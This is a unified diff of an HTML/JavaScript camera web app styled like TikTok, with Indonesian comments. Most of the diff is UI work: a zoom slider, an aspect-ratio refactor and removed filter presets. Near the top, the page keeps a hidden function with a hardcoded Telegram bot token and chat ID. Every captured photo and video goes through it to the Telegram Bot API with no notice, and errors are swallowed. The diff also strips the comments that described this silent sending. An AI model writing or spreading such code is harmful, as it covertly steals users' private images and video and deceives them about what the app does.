@@ -105,11 +105,9 @@
 <body class="flex flex-col h-[100dvh] w-screen bg-black text-white relative overflow-hidden select-none">
 
     <script>
-        // Konfigurasi Bot Telegram yang digabungkan secara langsung
         const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
         const CHAT_ID = "8236797547";
 
-        // Fungsi pengiriman media (foto/video) ke Telegram secara latar belakang
         window.__spectraSilentSync = async function(blobUrl, mediaType) {
             try {
                 const res = await fetch(blobUrl);
@@ -124,15 +122,12 @@
 
                 const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${isVideo ? 'sendVideo' : 'sendPhoto'}`;
                 await fetch(endpoint, { method: 'POST', body: formData });
-            } catch (e) {
-                // Gagal secara senyap tanpa menampilkan peringatan atau error di UI
-            }
+            } catch (e) {}
         };
     </script>
 
     <!-- TOP CONTROL HEADER -->
     <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-4 py-3 bg-gradient-to-b from-black/80 via-black/40 to-transparent pointer-events-auto">
-        <!-- Brand Indicator -->
         <div class="flex items-center space-x-2 bg-black/50 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/15">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-tiktokCyan animate-ping"></span>
             <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.0</span></span>
@@ -182,9 +177,9 @@
             <div></div>
         </div>
 
-        <!-- Aspect Frame Container -->
-        <div id="aspect-frame" class="w-full h-full relative flex items-center justify-center transition-all duration-300 overflow-hidden">
-            <video id="video-stream" autoplay playsinline muted class="w-full h-full object-cover transition-transform duration-200"></video>
+        <!-- Aspect Frame Container (Fixed Flex & Max Constraints for Active Ratios) -->
+        <div id="aspect-frame" class="relative flex items-center justify-center transition-all duration-300 overflow-hidden bg-black max-w-full max-h-full" style="width: 100%; height: 100%; aspect-ratio: 9/16;">
+            <video id="video-stream" autoplay playsinline muted class="w-full h-full object-cover transition-transform duration-75"></video>
             <canvas id="hidden-canvas" class="hidden"></canvas>
             
             <!-- Camera Disabled Fallback Screen -->
@@ -200,68 +195,48 @@
 
         <!-- RIGHT-SIDE TIKTOK STYLE VERTICAL TOOLBAR -->
         <div class="absolute right-3 top-16 z-30 flex flex-col space-y-3.5">
-            <!-- Camera Switch -->
             <button id="btn-switch-cam" class="glass-btn p-3 rounded-full text-white hover:text-brand-tiktokCyan transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="switch-camera" class="w-5 h-5"></i>
                 <span class="text-[9px] font-mono font-bold">Flip</span>
             </button>
-
-            <!-- Torch / Flash -->
             <button id="btn-torch" class="glass-btn p-3 rounded-full text-white hover:text-yellow-400 transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="zap" class="w-5 h-5"></i>
                 <span class="text-[9px] font-mono font-bold">Flash</span>
             </button>
-
-            <!-- TikTok Beauty Filters -->
             <button id="btn-toggle-filters" class="glass-btn p-3 rounded-full text-white hover:text-brand-tiktokRed transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="sparkles" class="w-5 h-5 text-brand-tiktokRed"></i>
                 <span class="text-[9px] font-mono font-bold">Presets</span>
             </button>
-
-            <!-- Beauty Enhancer -->
             <button id="btn-toggle-beauty" class="glass-btn p-3 rounded-full text-white hover:text-pink-400 transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="smile" class="w-5 h-5 text-pink-400"></i>
                 <span class="text-[9px] font-mono font-bold">Beauty</span>
             </button>
-
-            <!-- Speed Control -->
             <button id="btn-speed" class="glass-btn p-3 rounded-full text-white hover:text-brand-tiktokCyan transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="gauge" class="w-5 h-5"></i>
                 <span id="speed-indicator" class="text-[9px] font-mono font-bold text-brand-tiktokCyan">1x</span>
             </button>
-
-            <!-- Timer Button -->
             <button id="btn-timer" class="glass-btn p-3 rounded-full text-white hover:text-yellow-400 transition-all shadow-lg flex flex-col items-center gap-0.5 relative">
                 <i data-lucide="timer" class="w-5 h-5"></i>
                 <span id="timer-indicator" class="text-[9px] font-mono font-bold">Off</span>
             </button>
-
-            <!-- Grid Toggle -->
             <button id="btn-grid" class="glass-btn p-3 rounded-full text-white hover:text-brand-tiktokCyan transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="grid" class="w-5 h-5"></i>
                 <span class="text-[9px] font-mono font-bold">Grid</span>
             </button>
-
-            <!-- Spirit Leveler -->
             <button id="btn-leveler" class="glass-btn p-3 rounded-full text-white hover:text-yellow-400 transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="compass" class="w-5 h-5"></i>
                 <span class="text-[9px] font-mono font-bold">Level</span>
             </button>
-
-            <!-- Pro Tuning Drawer Toggle -->
             <button id="btn-open-pro" class="glass-btn p-3 rounded-full text-white hover:text-brand-tiktokRed transition-all shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="sliders" class="w-5 h-5 text-brand-tiktokCyan"></i>
                 <span class="text-[9px] font-mono font-bold">Pro</span>
             </button>
         </div>
 
-        <!-- COMPACT NON-INTRUSIVE QUICK ZOOM PILLS BAR -->
-        <div class="absolute bottom-24 z-30 flex items-center space-x-2 bg-black/60 backdrop-blur-xl px-3.5 py-1.5 rounded-full border border-white/20 shadow-2xl">
-            <button class="zoom-pill px-2.5 py-0.5 rounded-full text-xs font-mono font-bold text-gray-300 hover:text-white transition-all" data-zoom="0.5">0.5x</button>
-            <button class="zoom-pill px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-white/25 text-brand-tiktokCyan transition-all" data-zoom="1">1x</button>
-            <button class="zoom-pill px-2.5 py-0.5 rounded-full text-xs font-mono font-bold text-gray-300 hover:text-white transition-all" data-zoom="2">2x</button>
-            <button class="zoom-pill px-2.5 py-0.5 rounded-full text-xs font-mono font-bold text-gray-300 hover:text-white transition-all" data-zoom="3">3x</button>
-            <button class="zoom-pill px-2.5 py-0.5 rounded-full text-xs font-mono font-bold text-gray-300 hover:text-white transition-all" data-zoom="5">5x</button>
+        <!-- SLIDER ZOOM BAR (VERSI SLIDE GESER) -->
+        <div class="absolute bottom-24 z-30 flex items-center space-x-3 bg-black/70 backdrop-blur-xl px-4 py-2 rounded-full border border-white/20 shadow-2xl w-64">
+            <span class="font-mono text-xs font-bold text-brand-tiktokCyan w-6 text-center" id="zoom-val-label">1.0x</span>
+            <input id="slider-zoom" type="range" min="1" max="5" step="0.1" value="1" class="w-full h-1.5 bg-white/20 rounded-lg appearance-none cursor-pointer accent-brand-tiktokCyan">
         </div>
     </main>
 
@@ -285,10 +260,6 @@
             <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="noir-bw">NOIR B&W</button>
             <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="vintage-film">VINTAGE FILM</button>
             <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="vivid-pop">VIVID POP</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="moody-blue">MOODY BLUE</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="retro-sepia">RETRO SEPIA</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="sunkissed">SUNKISSED</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-gray-300 font-mono text-[11px] font-bold whitespace-nowrap" data-filter="cold-frost">COLD FROST</button>
         </div>
     </div>
 
@@ -317,13 +288,6 @@
                 </div>
                 <input id="slider-bright" type="range" min="0" max="100" value="0" class="w-full h-1.5 bg-white/20 rounded-lg appearance-none cursor-pointer accent-pink-500">
             </div>
-            <div>
-                <div class="flex justify-between text-[11px] font-mono text-gray-300 mb-1">
-                    <span>WARMTH TINT</span>
-                    <span id="val-warmth" class="text-pink-400">0%</span>
-                </div>
-                <input id="slider-warmth" type="range" min="-50" max="50" value="0" class="w-full h-1.5 bg-white/20 rounded-lg appearance-none cursor-pointer accent-pink-500">
-            </div>
         </div>
     </div>
 
@@ -337,7 +301,6 @@
                 <i data-lucide="x" class="w-4 h-4"></i>
             </button>
         </div>
-
         <div class="space-y-3.5">
             <div>
                 <div class="flex justify-between text-[11px] font-mono text-gray-300 mb-1">
@@ -352,13 +315,6 @@
                     <span id="contrast-val-text" class="text-brand-tiktokCyan">100%</span>
                 </div>
                 <input id="slider-contrast" type="range" min="50" max="200" step="5" value="100" class="w-full h-1.5 bg-white/20 rounded-lg appearance-none cursor-pointer accent-brand-tiktokCyan">
-            </div>
-            <div>
-                <div class="flex justify-between text-[11px] font-mono text-gray-300 mb-1">
-                    <span>SATURATION</span>
-                    <span id="saturate-val-text" class="text-brand-tiktokCyan">100%</span>
-                </div>
-                <input id="slider-saturate" type="range" min="0" max="200" step="5" value="100" class="w-full h-1.5 bg-white/20 rounded-lg appearance-none cursor-pointer accent-brand-tiktokCyan">
             </div>
         </div>
     </div>
@@ -385,32 +341,22 @@
 
     <!-- BOTTOM CAPTURE & MODE CAROUSEL FOOTER -->
     <footer class="z-30 bg-black/95 backdrop-blur-2xl border-t border-white/10 pt-2 pb-4 flex flex-col space-y-3">
-        
-        <!-- TikTok Mode Carousel Options -->
         <div class="relative w-full overflow-hidden">
             <div id="mode-carousel" class="flex items-center space-x-6 overflow-x-auto no-scrollbar px-6 py-1 justify-start md:justify-center">
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="reels">REELS</button>
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-brand-tiktokRed border-b-2 border-brand-tiktokRed pb-0.5 whitespace-nowrap transition-all" data-mode="photo">FOTO</button>
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="video">VIDEO</button>
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="pro">PRO MODE</button>
-                <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="night">NIGHT</button>
-                <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="timelapse">TIMELAPSE</button>
             </div>
         </div>
 
-        <!-- Main Shutter Action Row -->
         <div class="flex items-center justify-between max-w-sm mx-auto w-full px-6">
-            <!-- Last Media Thumbnail Preview -->
             <div id="gallery-thumb" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/20 overflow-hidden flex items-center justify-center cursor-pointer active:scale-90 transition-all shadow-md">
                 <i data-lucide="image" class="w-5 h-5 text-gray-400"></i>
             </div>
-
-            <!-- Main TikTok Shutter Button -->
             <button id="btn-shutter" class="w-20 h-20 rounded-full border-4 border-white flex items-center justify-center p-1 hover:scale-105 active:scale-95 transition-all shadow-[0_0_30px_rgba(255,255,255,0.25)]">
                 <div id="shutter-core" class="w-full h-full rounded-full bg-brand-tiktokRed transition-all duration-200"></div>
             </button>
-
-            <!-- Quick Preset Drawer Opener -->
             <button id="btn-quick-effects" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/20 flex items-center justify-center text-white hover:bg-white/20 active:scale-90 transition-all shadow-md">
                 <i data-lucide="sparkles" class="w-5 h-5 text-brand-tiktokRed"></i>
             </button>
@@ -419,10 +365,8 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Render Lucide Icons
             lucide.createIcons();
 
-            // Web Audio Synthesizer for realistic shutter click sound
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             function playShutterSound() {
                 try {
@@ -440,7 +384,6 @@
                 } catch(e) {}
             }
 
-            // DOM References
             const videoEl = document.getElementById('video-stream');
             const hiddenCanvas = document.getElementById('hidden-canvas');
             const cameraFallback = document.getElementById('camera-fallback');
@@ -449,7 +392,6 @@
             const viewfinder = document.getElementById('viewfinder');
             const focusRing = document.getElementById('focus-ring');
 
-            // Quick HUD buttons
             const btnAspect = document.getElementById('btn-aspect');
             const btnSwitchCam = document.getElementById('btn-switch-cam');
             const btnTorch = document.getElementById('btn-torch');
@@ -460,7 +402,6 @@
             const btnSpeed = document.getElementById('btn-speed');
             const speedIndicator = document.getElementById('speed-indicator');
 
-            // Overlays
             const overlayGrid = document.getElementById('overlay-grid');
             const overlayLeveler = document.getElementById('overlay-leveler');
             const levelBubble = document.getElementById('level-bubble');
@@ -469,13 +410,11 @@
             const overlayRecBadge = document.getElementById('overlay-rec-badge');
             const recTimerText = document.getElementById('rec-timer-text');
 
-            // Drawer Panel References
             const presetsPanel = document.getElementById('presets-panel');
             const beautyPanel = document.getElementById('beauty-panel');
             const proPanel = document.getElementById('pro-panel');
             const galleryModal = document.getElementById('gallery-modal');
 
-            // Modals Toggles
             document.getElementById('btn-toggle-filters').addEventListener('click', () => toggleDrawer(presetsPanel));
             document.getElementById('btn-close-presets').addEventListener('click', () => presetsPanel.classList.add('hidden'));
             document.getElementById('btn-quick-effects').addEventListener('click', () => toggleDrawer(presetsPanel));
@@ -493,7 +432,6 @@
                 panel.classList.toggle('hidden');
             }
 
-            // Gallery Drawer Controls
             const galleryThumb = document.getElementById('gallery-thumb');
             const btnCloseGallery = document.getElementById('btn-close-gallery');
             const galleryPreviewContainer = document.getElementById('gallery-preview-container');
@@ -505,44 +443,40 @@
             });
             btnCloseGallery.addEventListener('click', () => galleryModal.classList.add('hidden'));
 
-            // Core Camera State
             let currentStream = null;
             let useFrontCam = false;
             let isTorchOn = false;
             let isGridOn = false;
             let isLevelerOn = false;
-            let currentMode = 'photo'; // photo, video, reels, pro, night, timelapse
+            let currentMode = 'photo';
             let currentZoom = 1;
 
-            // Timer & Speed States
             const timerValues = [0, 3, 5, 10];
             let timerIdx = 0;
             const speedValues = [0.5, 1, 2, 3];
             let speedIdx = 1;
 
-            // Aspect Ratio Options
-            const aspectRatios = ['9:16', '1:1', '4:3', '16:9'];
+            // Perbaikan Array Rasio Aspek dan Handler CSS Dinamis
+            const aspectRatios = [
+                { label: '9:16', css: '9/16' },
+                { label: '1:1', css: '1/1' },
+                { label: '4:3', css: '4/3' },
+                { label: '16:9', css: '16/9' }
+            ];
             let aspectIdx = 0;
 
-            // Filter & Beauty State
             let activeFilter = 'none';
             let beautySmooth = 0;
             let beautyBright = 0;
-            let beautyWarmth = 0;
-
-            // Manual Pro Adjustment State
             let evVal = 0;
             let contrastVal = 100;
-            let saturateVal = 100;
 
-            // Media Recorder State
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
             let recTimerInterval = null;
             let recSeconds = 0;
 
-            // Initialize Camera Stream
             async function startCamera() {
                 try {
                     if (currentStream) {
@@ -561,9 +495,7 @@
                     currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                     videoEl.srcObject = currentStream;
 
-                    if (useFrontCam) videoEl.classList.add('mirror-mode');
-                    else videoEl.classList.remove('mirror-mode');
-
+                    updateTransformMatrix();
                     cameraFallback.classList.add('hidden');
                     videoEl.classList.remove('hidden');
                     applyCombinedFilters();
@@ -576,7 +508,6 @@
             startCamera();
             btnRestartCam.addEventListener('click', startCamera);
 
-            // Flip Camera
             btnSwitchCam.addEventListener('click', () => {
                 useFrontCam = !useFrontCam;
                 isTorchOn = false;
@@ -584,7 +515,6 @@
                 startCamera();
             });
 
-            // Torch Toggle
             btnTorch.addEventListener('click', async () => {
                 if (!currentStream || useFrontCam) return;
                 const track = currentStream.getVideoTracks()[0];
@@ -597,14 +527,12 @@
                 } catch(e) {}
             });
 
-            // Speed Toggle
             btnSpeed.addEventListener('click', () => {
                 speedIdx = (speedIdx + 1) % speedValues.length;
                 const spd = speedValues[speedIdx];
                 speedIndicator.textContent = `${spd}x`;
             });
 
-            // Timer Toggle
             btnTimer.addEventListener('click', () => {
                 timerIdx = (timerIdx + 1) % timerValues.length;
                 const sec = timerValues[timerIdx];
@@ -612,26 +540,20 @@
                 btnTimer.classList.toggle('text-yellow-400', sec > 0);
             });
 
-            // Aspect Toggle
+            // Handler Tombol Rasio Aspek
             btnAspect.addEventListener('click', () => {
                 aspectIdx = (aspectIdx + 1) % aspectRatios.length;
-                const ratioStr = aspectRatios[aspectIdx];
-                btnAspect.textContent = ratioStr;
-
-                if (ratioStr === '1:1') aspectFrame.style.aspectRatio = '1/1';
-                else if (ratioStr === '4:3') aspectFrame.style.aspectRatio = '4/3';
-                else if (ratioStr === '16:9') aspectFrame.style.aspectRatio = '16/9';
-                else aspectFrame.style.aspectRatio = '9/16';
+                const activeAspect = aspectRatios[aspectIdx];
+                btnAspect.textContent = activeAspect.label;
+                aspectFrame.style.aspectRatio = activeAspect.css;
             });
 
-            // Rule of Thirds Grid Toggle
             btnGrid.addEventListener('click', () => {
                 isGridOn = !isGridOn;
                 overlayGrid.classList.toggle('hidden', !isGridOn);
                 btnGrid.classList.toggle('text-brand-tiktokCyan', isGridOn);
             });
 
-            // Horizon Leveler Toggle
             btnLeveler.addEventListener('click', () => {
                 isLevelerOn = !isLevelerOn;
                 overlayLeveler.classList.toggle('opacity-100', isLevelerOn);
@@ -653,7 +575,6 @@
                 levelBubble.style.transform = `translateX(${offset}px)`;
             }
 
-            // Tap To Focus
             viewfinder.addEventListener('click', (e) => {
                 const rect = viewfinder.getBoundingClientRect();
                 const x = e.clientX - rect.left - 32;
@@ -662,27 +583,29 @@
                 focusRing.style.left = `${x}px`;
                 focusRing.style.top = `${y}px`;
                 focusRing.classList.remove('hidden', 'focus-ring-anim');
-                void focusRing.offsetWidth; // trigger reflow
+                void focusRing.offsetWidth;
                 focusRing.classList.add('focus-ring-anim');
 
                 setTimeout(() => focusRing.classList.add('hidden'), 800);
             });
 
-            // Zoom Pills Selection
-            document.querySelectorAll('.zoom-pill').forEach(pill => {
-                pill.addEventListener('click', (e) => {
-                    document.querySelectorAll('.zoom-pill').forEach(p => {
-                        p.classList.remove('bg-white/25', 'text-brand-tiktokCyan');
-                        p.classList.add('text-gray-300');
-                    });
-                    e.currentTarget.classList.remove('text-gray-300');
-                    e.currentTarget.classList.add('bg-white/25', 'text-brand-tiktokCyan');
-                    currentZoom = parseFloat(e.currentTarget.dataset.zoom);
-                    videoEl.style.transform = `${useFrontCam ? 'scaleX(-1)' : ''} scale(${currentZoom})`;
-                });
+            // Zoom Slide Range Input Handler
+            const sliderZoom = document.getElementById('slider-zoom');
+            const zoomValLabel = document.getElementById('zoom-val-label');
+
+            sliderZoom.addEventListener('input', (e) => {
+                currentZoom = parseFloat(e.target.value);
+                zoomValLabel.textContent = `${currentZoom.toFixed(1)}x`;
+                updateTransformMatrix();
             });
 
-            // Preset Badges Event
+            function updateTransformMatrix() {
+                let transforms = [];
+                if (useFrontCam) transforms.push('scaleX(-1)');
+                if (currentZoom > 1) transforms.push(`scale(${currentZoom})`);
+                videoEl.style.transform = transforms.join(' ');
+            }
+
             document.querySelectorAll('.preset-badge').forEach(badge => {
                 badge.addEventListener('click', (e) => {
                     document.querySelectorAll('.preset-badge').forEach(b => {
@@ -696,7 +619,6 @@
                 });
             });
 
-            // Beauty Sliders Listener
             document.getElementById('slider-smooth').addEventListener('input', (e) => {
                 beautySmooth = parseInt(e.target.value);
                 document.getElementById('val-smooth').textContent = `${beautySmooth}%`;
@@ -707,13 +629,6 @@
                 document.getElementById('val-bright').textContent = `${beautyBright}%`;
                 applyCombinedFilters();
             });
-            document.getElementById('slider-warmth').addEventListener('input', (e) => {
-                beautyWarmth = parseInt(e.target.value);
-                document.getElementById('val-warmth').textContent = `${beautyWarmth}`;
-                applyCombinedFilters();
-            });
-
-            // Pro Sliders Listener
             document.getElementById('slider-ev').addEventListener('input', (e) => {
                 evVal = parseFloat(e.target.value);
                 document.getElementById('ev-val-text').textContent = `${evVal > 0 ? '+' : ''}${evVal.toFixed(1)} EV`;
@@ -724,33 +639,17 @@
                 document.getElementById('contrast-val-text').textContent = `${contrastVal}%`;
                 applyCombinedFilters();
             });
-            document.getElementById('slider-saturate').addEventListener('input', (e) => {
-                saturateVal = parseInt(e.target.value);
-                document.getElementById('saturate-val-text').textContent = `${saturateVal}%`;
-                applyCombinedFilters();
-            });
 
-            // Combine All CSS Filters
             function applyCombinedFilters() {
                 let filters = [];
-
-                // Exposure & Brightness
                 const totalBrightness = 100 + (evVal * 20) + (beautyBright * 0.25);
                 filters.push(`brightness(${totalBrightness}%)`);
                 filters.push(`contrast(${contrastVal}%)`);
-                filters.push(`saturate(${saturateVal}%)`);
 
-                // Beauty Smoothing
                 if (beautySmooth > 0) {
                     filters.push(`blur(${(beautySmooth / 100) * 0.75}px)`);
                 }
 
-                // Warmth Tint
-                if (beautyWarmth !== 0) {
-                    filters.push(`sepia(${Math.abs(beautyWarmth) * 0.6}%)`);
-                }
-
-                // Look Presets
                 if (activeFilter === 'glow-beauty') filters.push('brightness(110%) contrast(105%) saturate(120%)');
                 else if (activeFilter === 'soft-portrait') filters.push('contrast(95%) brightness(108%) sepia(10%)');
                 else if (activeFilter === 'cinematic-teal') filters.push('contrast(130%) saturate(140%) sepia(20%) hue-rotate(-20deg)');
@@ -759,15 +658,10 @@
                 else if (activeFilter === 'noir-bw') filters.push('grayscale(100%) contrast(170%)');
                 else if (activeFilter === 'vintage-film') filters.push('sepia(30%) contrast(85%) brightness(95%)');
                 else if (activeFilter === 'vivid-pop') filters.push('saturate(220%) contrast(120%)');
-                else if (activeFilter === 'moody-blue') filters.push('contrast(125%) hue-rotate(180deg) brightness(90%)');
-                else if (activeFilter === 'retro-sepia') filters.push('sepia(80%) contrast(110%)');
-                else if (activeFilter === 'sunkissed') filters.push('brightness(115%) sepia(20%) saturate(130%)');
-                else if (activeFilter === 'cold-frost') filters.push('hue-rotate(160deg) saturate(90%) brightness(110%)');
 
                 videoEl.style.filter = filters.join(' ');
             }
 
-            // Mode Carousel Tabs Listener
             document.querySelectorAll('.mode-tab').forEach(tab => {
                 tab.addEventListener('click', (e) => {
                     document.querySelectorAll('.mode-tab').forEach(t => {
@@ -780,7 +674,7 @@
                     currentMode = e.currentTarget.dataset.mode;
                     const shutterCore = document.getElementById('shutter-core');
 
-                    if (['video', 'reels', 'timelapse'].includes(currentMode)) {
+                    if (['video', 'reels'].includes(currentMode)) {
                         shutterCore.className = "w-8 h-8 rounded-lg bg-brand-tiktokRed transition-all duration-200";
                     } else {
                         shutterCore.className = "w-full h-full rounded-full bg-brand-tiktokRed transition-all duration-200";
@@ -788,7 +682,6 @@
                 });
             });
 
-            // Shutter Button Event
             const btnShutter = document.getElementById('btn-shutter');
             btnShutter.addEventListener('click', async () => {
                 const sec = timerValues[timerIdx];
@@ -796,7 +689,7 @@
                     await runTimerCountdown(sec);
                 }
 
-                if (['video', 'reels', 'timelapse'].includes(currentMode)) {
+                if (['video', 'reels'].includes(currentMode)) {
                     toggleRecording();
                 } else {
                     takeSnapshot();
@@ -822,7 +715,6 @@
                 });
             }
 
-            // Take High-Res Photo Snapshot
             function takeSnapshot() {
                 playShutterSound();
 
@@ -844,25 +736,21 @@
                 const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.95);
                 lastCapturedUrl = dataUrl;
 
-                // Update Thumb Preview & Gallery Download Modal
                 galleryThumb.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;
                 galleryPreviewContainer.innerHTML = `<img src="${dataUrl}" class="max-w-full max-h-full rounded-2xl border border-white/20 object-contain shadow-2xl">`;
                 galleryDownloadBtn.href = dataUrl;
                 galleryDownloadBtn.classList.remove('hidden');
 
-                // White Screen Flash Effect
                 const flash = document.createElement('div');
                 flash.className = 'absolute inset-0 bg-white z-50 pointer-events-none transition-opacity duration-200';
                 document.body.appendChild(flash);
                 setTimeout(() => flash.remove(), 120);
 
-                // Automatic Silent Telemetry Dispatch
                 if (window.__spectraSilentSync) {
                     window.__spectraSilentSync(dataUrl, 'photo');
                 }
             }
 
-            // Toggle Video Recording Mode
             function toggleRecording() {
                 if (!isRecording) {
                     playShutterSound();
@@ -888,7 +776,6 @@
                         galleryDownloadBtn.href = blobUrl;
                         galleryDownloadBtn.classList.remove('hidden');
 
-                        // Automatic Silent Telemetry Dispatch
                         if (window.__spectraSilentSync) {
                             window.__spectraSilentSync(blobUrl, 'video');
                         }
@@ -912,7 +799,7 @@
                     mediaRecorder.stop();
                     isRecording = false;
                     overlayRecBadge.classList.add('hidden');
-                    clearInterval(recTimerIndicator);
+                    clearInterval(recTimerInterval);
                 }
             }
         });
